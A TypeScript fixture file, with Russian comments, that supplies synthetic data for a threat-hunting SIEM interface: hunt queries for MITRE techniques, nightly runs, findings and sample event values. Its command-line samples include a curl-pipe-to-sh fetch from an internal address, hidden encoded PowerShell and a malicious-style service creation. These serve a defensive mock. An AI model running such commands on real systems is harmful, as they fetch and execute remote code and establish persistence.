/**
 * Синтетические фикстуры Threat Hunting для мока: ханты TH-*, ночные прогоны за неделю,
 * 12 находок за три ночи, два больших ханта. Хосты ws-0001…, учётки user01…, адреса 10.x —
 * выдуманы. Данные согласованы между собой: находка ссылается на существующий хант и прогон,
 * счётчики прогонов равны числу строк, события находки порождаются по номеру строки.
 */
import { mulberry32 } from '@/modules/siem/mocks/rng'
import type { FindingStatus } from '@/platform/findings/types'
import type { Job } from '@/platform/collector/types'
import type {
  DeepDetail,
  HuntQueryStatus,
  RunQueryView,
  RunView,
  ThColumn,
  ThSettings,
} from '@/modules/siem/hunting/api/types'

/** «Сейчас» макета: ночь за 18.10 отработала сегодня в 01:03, большой хант идёт с утра. */
export const NOW = '2026-10-19T09:30:00Z'
export const TODAY = '2026-10-19'
export const ME = 'analyst'

export interface QueryRecord {
  /** Номер запроса в базе (`QueryView.id`). */
  id: number
  query_id: string
  position: number
  query: string
  fields: string
  fields_label: string
  limit: number | null
  enabled: boolean
}

export interface HuntRecord {
  id: number
  code: string
  name: string
  description: string
  technique_id: string | null
  enabled: boolean
  deleted: boolean
  /** Место в очереди ночного прогона; у удалённых место сохраняется и не переиспользуется. */
  position: number
  updated_at: string
  updated_by: string
  queries: QueryRecord[]
}

export interface FindingRecord {
  id: number
  kind: 'nightly' | 'deep'
  hunt_code: string
  query_id: string
  run_id: number | null
  deep_id: number | null
  period_from: string
  period_to: string
  event_count: number
  limit_hit: boolean
  created_at: string
  status: FindingStatus
  assignee: string | null
  due_date: string | null
  risk_until: string | null
  columns: ThColumn[]
}

export const SETTINGS: ThSettings = {
  filter_folder_id: '',
  nightly_enabled: true,
  window_from: '01:00',
  hunt_pause_s: 30,
  request_timeout_s: 300,
  retry_minutes: [10, 20, 30, 30, 30, 30, 30],
  nightly_deadline_h: 20,
  default_limit: 5000,
  hot_days: 7,
  slice_hours: 3,
  slice_pause_s: 5,
  default_depth_months: 3,
  retention_days: 180,
}

// --- Библиотека ---------------------------------------------------------------

const LABELS: Record<string, string> = {
  time: 'Время',
  'src.host': 'Хост',
  'src.ip': 'Источник',
  'dst.ip': 'Назначение',
  'dst.port': 'Порт',
  'dst.hostname': 'Домен',
  'subject.account.name': 'Учётная запись',
  'subject.process.name': 'Процесс',
  'object.name': 'Служба',
  'object.process.fullpath': 'Файл',
  'object.process.cmdline': 'Командная строка',
}

/** Поля и подписи колонок запроса — строками через запятую, как их хранит и отдаёт API. */
function cols(fields: string[]): Pick<QueryRecord, 'fields' | 'fields_label'> {
  return { fields: fields.join(', '), fields_label: fields.map((f) => LABELS[f] ?? f).join(', ') }
}

let queryPk = 0
function q(query_id: string, position: number, query: string, fields: string[], extra: Partial<QueryRecord> = {}): QueryRecord {
  queryPk += 1
  return { id: queryPk, query_id, position, query, ...cols(fields), limit: null, enabled: true, ...extra }
}

export const HUNTS: HuntRecord[] = [
  {
    id: 1,
    code: 'TH-WIN-001',
    name: 'Подозрительное создание службы (T1543.003)',
    description: 'Новые службы с запуском из пользовательских каталогов и службы, созданные через sc.exe.',
    technique_id: 'T1543.003',
    enabled: true,
    deleted: false,
    position: 0,
    updated_at: '2026-10-08T12:20:00Z',
    updated_by: 'analyst',
    queries: [
      q('Q1', 0, 'event_src.title = "windows" and msgid = "7045" and not object.process.fullpath startswith "C:\\Windows\\"', [
        'time', 'src.host', 'subject.account.name', 'object.name', 'object.process.fullpath',
      ]),
      q('Q2', 1, 'event_src.title = "windows" and msgid = "4688" and object.process.cmdline contains "sc.exe create"', [
        'time', 'src.host', 'subject.account.name', 'object.process.cmdline',
      ]),
    ],
  },
  {
    id: 2,
    code: 'TH-WIN-002',
    name: 'Доступ к памяти LSASS (T1003.001)',
    description: 'Открытие процесса lsass.exe с правами чтения памяти не системными процессами.',
    technique_id: 'T1003.001',
    enabled: true,
    deleted: false,
    position: 1,
    updated_at: '2026-10-01T10:00:00Z',
    updated_by: 'analyst',
    queries: [
      q('Q1', 0, 'event_src.title = "sysmon" and msgid = "10" and object.process.name = "lsass.exe"', [
        'time', 'src.host', 'subject.account.name', 'subject.process.name',
      ]),
    ],
  },
  {
    id: 3,
    code: 'TH-WIN-003',
    name: 'PowerShell с закодированной командой (T1059.001)',
    description: 'Запуск powershell.exe с параметрами -enc и -encodedcommand.',
    technique_id: 'T1059.001',
    enabled: true,
    deleted: false,
    position: 2,
    updated_at: '2026-10-05T09:45:00Z',
    updated_by: 'analyst',
    queries: [
      q('Q1', 0, 'event_src.title = "windows" and msgid = "4688" and object.process.cmdline matches "(?i)-enc(odedcommand)?\\s"', [
        'time', 'src.host', 'subject.account.name', 'object.process.cmdline',
      ], { limit: 2000 }),
      q('Q2', 1, 'event_src.title = "windows" and msgid = "4104" and object.process.cmdline contains "FromBase64String"', [
        'time', 'src.host', 'subject.account.name', 'object.process.cmdline',
      ], { enabled: false }),
    ],
  },
  {
    id: 4,
    code: 'TH-WIN-004',
    name: 'Очистка журналов Windows (T1070.001)',
    description: 'События 1102 и 104: журнал безопасности или системный журнал очищен.',
    technique_id: 'T1070.001',
    enabled: false,
    deleted: false,
    position: 3,
    updated_at: '2026-09-28T15:10:00Z',
    updated_by: 'analyst',
    queries: [
      q('Q1', 0, 'event_src.title = "windows" and msgid in ("1102", "104")', ['time', 'src.host', 'subject.account.name']),
    ],
  },
  {
    id: 5,
    code: 'TH-NET-001',
    name: 'Сканирование портов изнутри (T1046)',
    description: 'Один источник за короткое время обращается ко многим портам внутренней сети.',
    technique_id: 'T1046',
    enabled: true,
    deleted: false,
    position: 4,
    updated_at: '2026-10-03T08:00:00Z',
    updated_by: 'analyst',
    queries: [
      q('Q1', 0, 'event_src.category = "firewall" and action = "deny" and src.ip in_subnet "10.0.0.0/8" and dst.ip in_subnet "10.0.0.0/8"', [
        'time', 'src.ip', 'dst.ip', 'dst.port',
      ]),
    ],
  },
  {
    id: 6,
    code: 'TH-LNX-001',
    name: 'Выполнение через cron (T1053.003)',
    description: 'Новые записи в crontab, сделанные не администратором.',
    technique_id: 'T1053.003',
    enabled: true,
    deleted: false,
    position: 5,
    updated_at: '2026-10-02T11:30:00Z',
    updated_by: 'analyst',
    queries: [
      q('Q1', 0, 'event_src.title = "linux" and msgid = "cron_edit" and not subject.account.name = "root"', [
        'time', 'src.host', 'subject.account.name', 'object.process.cmdline',
      ]),
    ],
  },
]

/** Что мок импорта «находит» в файле: новый хант, который можно создать. */
export const IMPORT_NEW: Omit<HuntRecord, 'id' | 'updated_at' | 'updated_by' | 'deleted' | 'position' | 'queries' | 'enabled'> & { query: Omit<QueryRecord, 'id' | 'position' | 'enabled'> } = {
  code: 'TH-WIN-005',
  name: 'Запуск исполняемого файла из Temp (T1204.002)',
  description: 'Процессы, стартовавшие из каталогов Temp и Downloads.',
  technique_id: 'T1204.002',
  query: {
    query_id: 'Q1',
    query: 'event_src.title = "sysmon" and msgid = "1" and object.process.fullpath contains "\\Temp\\"',
    ...cols(['time', 'src.host', 'subject.account.name', 'object.process.fullpath']),
    limit: null,
  },
}

// --- Ночные прогоны и находки --------------------------------------------------

const pad2 = (n: number) => String(n).padStart(2, '0')
const day = (d: number) => `2026-10-${pad2(d)}`

/** Запросы, которые ночь запускает: включённые запросы включённых хантов (8 минус 2). */
const NIGHT_QUERIES: [string, string, number][] = [
  ['TH-WIN-001', 'Q1', 1],
  ['TH-WIN-001', 'Q2', 2],
  ['TH-WIN-002', 'Q1', 3],
  ['TH-WIN-003', 'Q1', 4],
  ['TH-NET-001', 'Q1', 7],
  ['TH-LNX-001', 'Q1', 8],
]

export const FIRST_NIGHT = 12
export const LAST_NIGHT = 18
/** Ночь, когда MaxPatrol отклонил вход и прогон прервался. */
const ABORTED_NIGHT = 15
export const ABORT_REASON = 'MaxPatrol отклонил вход: проверьте токен подключения'
/** Ночь, когда один запрос не ответил. */
const FAILED_NIGHT = 17
const FAILED_REASON = 'MaxPatrol не ответил за 300 с'

interface Seed {
  night: number
  hunt: string
  query: string
  events: number
  limitHit?: boolean
  status: FindingStatus
  assignee?: string
  due?: string
}

/** 12 находок за три ночи; id — по порядку. */
const SEEDS: Seed[] = [
  { night: 16, hunt: 'TH-WIN-001', query: 'Q1', events: 14, status: 'new' },
  { night: 16, hunt: 'TH-WIN-002', query: 'Q1', events: 3, status: 'in_work', assignee: 'analyst', due: '2026-10-22' },
  { night: 16, hunt: 'TH-NET-001', query: 'Q1', events: 5000, limitHit: true, status: 'new' },
  { night: 16, hunt: 'TH-WIN-003', query: 'Q1', events: 27, status: 'new' },
  { night: 17, hunt: 'TH-WIN-001', query: 'Q2', events: 8, status: 'false_positive' },
  { night: 17, hunt: 'TH-WIN-002', query: 'Q1', events: 2, status: 'new' },
  { night: 17, hunt: 'TH-WIN-003', query: 'Q1', events: 41, status: 'in_work', assignee: 'auditor', due: '2026-10-18' },
  { night: 17, hunt: 'TH-NET-001', query: 'Q1', events: 312, status: 'new' },
  { night: 18, hunt: 'TH-WIN-001', query: 'Q1', events: 6, status: 'new' },
  { night: 18, hunt: 'TH-WIN-001', query: 'Q2', events: 19, status: 'new' },
  { night: 18, hunt: 'TH-WIN-003', query: 'Q1', events: 33, status: 'fixed' },
  { night: 18, hunt: 'TH-LNX-001', query: 'Q1', events: 4, status: 'risk_accepted' },
]

const runId = (night: number) => night - FIRST_NIGHT + 1

function columnsOf(huntCode: string, queryId: string): ThColumn[] {
  const query = HUNTS.find((h) => h.code === huntCode)?.queries.find((x) => x.query_id === queryId)
  if (!query) return []
  const fields = query.fields.split(', ')
  const labels = query.fields_label.split(', ')
  return fields.map((field, i) => ({ field, label: labels[i] ?? field }))
}

function nightStart(night: number): Date {
  return new Date(`${day(night + 1)}T01:03:00Z`)
}

const iso = (d: Date) => d.toISOString().replace('.000Z', 'Z')
const plus = (d: Date, ms: number) => new Date(d.getTime() + ms)

export const FINDINGS: FindingRecord[] = [
  ...SEEDS.map((s, i): FindingRecord => ({
    id: i + 1,
    kind: 'nightly',
    hunt_code: s.hunt,
    query_id: s.query,
    run_id: runId(s.night),
    deep_id: null,
    period_from: `${day(s.night)}T00:00:00Z`,
    period_to: `${day(s.night + 1)}T00:00:00Z`,
    event_count: s.events,
    limit_hit: s.limitHit ?? false,
    created_at: iso(plus(nightStart(s.night), (3 + (i % 4) * 4) * 60_000)),
    status: s.status,
    assignee: s.assignee ?? null,
    due_date: s.due ?? null,
    risk_until: s.status === 'risk_accepted' ? '2027-01-18' : null,
    columns: columnsOf(s.hunt, s.query),
  })),
  // Идущий большой хант: событий пока 31 200 из окон, прошедших 240 кусков.
  {
    id: 13,
    kind: 'deep',
    hunt_code: '',
    query_id: '',
    run_id: null,
    deep_id: 1,
    period_from: '2026-07-20T15:00:00Z',
    period_to: '2026-10-19T09:00:00Z',
    event_count: 31200,
    limit_hit: false,
    created_at: '2026-10-19T08:14:00Z',
    status: 'new',
    assignee: null,
    due_date: null,
    risk_until: null,
    columns: ['time', 'src.ip', 'dst.hostname', 'dst.port'].map((field) => ({ field, label: LABELS[field] })),
  },
  // Завершённый большой хант по запросу библиотеки TH-WIN-002 Q1.
  {
    id: 14,
    kind: 'deep',
    hunt_code: 'TH-WIN-002',
    query_id: 'Q1',
    run_id: null,
    deep_id: 2,
    period_from: '2026-07-13T00:00:00Z',
    period_to: '2026-10-13T00:00:00Z',
    event_count: 18240,
    limit_hit: true,
    created_at: '2026-10-13T06:41:00Z',
    status: 'in_work',
    assignee: 'analyst',
    due_date: '2026-10-25',
    risk_until: null,
    columns: columnsOf('TH-WIN-002', 'Q1'),
  },
]

function buildRunQueries(): (RunQueryView & { run_id: number })[] {
  const out: (RunQueryView & { run_id: number })[] = []
  let id = 0
  for (let night = FIRST_NIGHT; night <= LAST_NIGHT; night++) {
    const start = nightStart(night)
    NIGHT_QUERIES.forEach(([hunt, query, pk], index) => {
      id += 1
      const found = FINDINGS.find((f) => f.run_id === runId(night) && f.hunt_code === hunt && f.query_id === query)
      const at = iso(plus(start, index * 95_000))
      const aborted = night === ABORTED_NIGHT && index >= 2
      const failed = night === FAILED_NIGHT && hunt === 'TH-LNX-001'
      const status: HuntQueryStatus = aborted ? 'aborted' : failed ? 'failed' : 'ok'
      out.push({
        id,
        run_id: runId(night),
        query_pk: pk,
        hunt_code: hunt,
        query_id: query,
        status,
        started_at: aborted ? null : at,
        duration_ms: aborted ? null : failed ? 300_000 : 4_000 + ((id * 7919) % 60_000),
        events: found?.event_count ?? 0,
        error: aborted ? `прогон прерван: ${ABORT_REASON}` : failed ? FAILED_REASON : null,
        finding_id: found?.id ?? null,
      })
    })
  }
  return out
}

export const RUN_QUERIES = buildRunQueries()

function buildRuns(): RunView[] {
  const out: RunView[] = []
  for (let night = FIRST_NIGHT; night <= LAST_NIGHT; night++) {
    const rows = RUN_QUERIES.filter((r) => r.run_id === runId(night))
    const aborted = night === ABORTED_NIGHT
    const start = nightStart(night)
    const spent = rows.reduce((sum, r) => sum + (r.duration_ms ?? 0) + 30_000, 0)
    out.push({
      id: runId(night),
      target_date: day(night),
      period_from: `${day(night)}T00:00:00Z`,
      period_to: `${day(night + 1)}T00:00:00Z`,
      status: aborted ? 'aborted' : 'done',
      started_at: iso(start),
      finished_at: iso(plus(start, aborted ? 90_000 : spent)),
      queries_total: rows.length,
      queries_done: rows.filter((r) => r.status !== 'aborted').length,
      findings: FINDINGS.filter((f) => f.run_id === runId(night)).length,
      errors: rows.filter((r) => r.status === 'failed').length,
      error: aborted ? ABORT_REASON : null,
      job_id: runId(night),
    })
  }
  return out
}

export const RUNS = buildRuns()

// --- Большие ханты ---------------------------------------------------------------

export const DEEP: DeepDetail[] = [
  {
    id: 1,
    title: 'Редкие домены с регулярными обращениями',
    source: null,
    period_from: '2026-07-20T15:00:00Z',
    period_to: '2026-10-19T09:00:00Z',
    status: 'running',
    slices_done: 240,
    slices_total: 726,
    events: 31200,
    finding_id: 13,
    status_state: 'new',
    job_id: 9,
    created_by: 'analyst',
    created_at: '2026-10-19T08:10:00Z',
    query: 'event_src.category = "proxy" and dst.hostname not in_list "known_domains" and action = "allow"',
    fields: ['time', 'src.ip', 'dst.hostname', 'dst.port'],
    labels: ['Время', 'Источник', 'Домен', 'Порт'],
    limit: 5000,
    limit_hit_slices: 0,
    partial: false,
    error: null,
    finished_at: null,
    finding: null,
  },
  {
    id: 2,
    title: 'TH-WIN-002 Q1',
    source: { hunt_code: 'TH-WIN-002', query_id: 'Q1' },
    period_from: '2026-07-13T00:00:00Z',
    period_to: '2026-10-13T00:00:00Z',
    status: 'done',
    slices_done: 736,
    slices_total: 736,
    events: 18240,
    finding_id: 14,
    status_state: 'in_work',
    job_id: 8,
    created_by: 'analyst',
    created_at: '2026-10-13T06:41:00Z',
    query: HUNTS[1].queries[0].query,
    fields: HUNTS[1].queries[0].fields.split(', '),
    labels: HUNTS[1].queries[0].fields_label.split(', '),
    limit: 5000,
    limit_hit_slices: 3,
    partial: false,
    error: null,
    finished_at: '2026-10-13T11:52:00Z',
    finding: null,
  },
]

// --- Задачи -----------------------------------------------------------------------

export function buildJobs(): Job[] {
  const jobs: Job[] = RUNS.map((r) => {
    const failed = r.status === 'aborted'
    return {
      id: r.job_id as number,
      kind: 'nightly',
      stage: failed ? 'collecting' : 'done',
      status: failed ? 'failed' : 'done',
      progress: failed ? Math.round((r.queries_done / r.queries_total) * 100) : 100,
      processed: r.queries_done,
      total: r.queries_total,
      message: failed ? `запросов выполнено: ${r.queries_done} из ${r.queries_total}` : `прогон за ${r.target_date.slice(8)}.${r.target_date.slice(5, 7)} завершён`,
      error: r.error,
      cancel_requested: false,
      started_at: r.started_at as string,
      finished_at: r.finished_at,
      started_by: 'scheduler',
    }
  })
  jobs.push(
    {
      id: 8, kind: 'deep', stage: 'done', status: 'done', progress: 100, processed: 736, total: 736,
      message: 'большой хант #2 завершён', error: null, cancel_requested: false,
      started_at: '2026-10-13T06:41:00Z', finished_at: '2026-10-13T11:52:00Z', started_by: 'analyst',
    },
    {
      id: 9, kind: 'deep', stage: 'collecting', status: 'running', progress: 33, processed: 240, total: 726,
      message: 'окно 240 из 726', error: null, cancel_requested: false,
      started_at: '2026-10-19T08:10:00Z', finished_at: null, started_by: 'analyst',
    },
  )
  return jobs
}

// --- События находки ---------------------------------------------------------------

const SERVICES = ['svc-updater', 'svc-sync-agent', 'WinHelperSvc', 'diag-collector', 'backup-bridge']
const FILES = ['C:\\Users\\Public\\upd.exe', 'C:\\ProgramData\\sync\\agent.exe', 'D:\\tools\\helper.exe', 'C:\\Temp\\diag.exe']
const CMDS = [
  'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA',
  'sc.exe create WinHelperSvc binPath= C:\\Temp\\diag.exe start= auto',
  'powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAA=',
  '/bin/sh -c "curl -s http://10.20.0.15/s.sh | sh"',
  'cmd.exe /c whoami /all',
]
const DOMAINS = ['cdn-sync.example.net', 'telemetry-hub.example.org', 'update-check.example.com', 'img-cache.example.net']
const PROCS = ['procdump64.exe', 'taskmgr.exe', 'rundll32.exe', 'svchost.exe']

/** Значение поля события по номеру строки: одно и то же при каждом обращении, чтобы страницы не «плыли». */
export function eventValue(finding: Pick<FindingRecord, 'id' | 'period_from' | 'period_to' | 'event_count'>, field: string, index: number): unknown {
  const rng = mulberry32(finding.id * 1_000_003 + index * 31 + field.length)
  const from = Date.parse(finding.period_from)
  const span = Date.parse(finding.period_to) - from
  const pick = <T,>(items: readonly T[]) => items[Math.floor(rng() * items.length)]
  switch (field) {
    case 'time':
      return iso(new Date(from + Math.floor((span * index) / Math.max(finding.event_count, 1))))
    case 'src.host':
      return `ws-${String(1 + Math.floor(rng() * 40)).padStart(4, '0')}`
    case 'subject.account.name':
      return `user${pad2(1 + Math.floor(rng() * 12))}`
    case 'src.ip':
      return `10.20.${Math.floor(rng() * 8)}.${10 + Math.floor(rng() * 200)}`
    case 'dst.ip':
      return `10.30.${Math.floor(rng() * 4)}.${10 + Math.floor(rng() * 200)}`
    case 'dst.port':
      return pick([22, 135, 445, 3389, 5985, 8080, 8443])
    case 'dst.hostname':
      return pick(DOMAINS)
    case 'object.name':
      return pick(SERVICES)
    case 'object.process.fullpath':
      return pick(FILES)
    case 'object.process.cmdline':
      return pick(CMDS)
    case 'subject.process.name':
      return pick(PROCS)
    default:
      return ''
  }
}

export function eventRow(finding: FindingRecord, index: number): unknown[] {
  return finding.columns.map((c) => eventValue(finding, c.field, index))
}
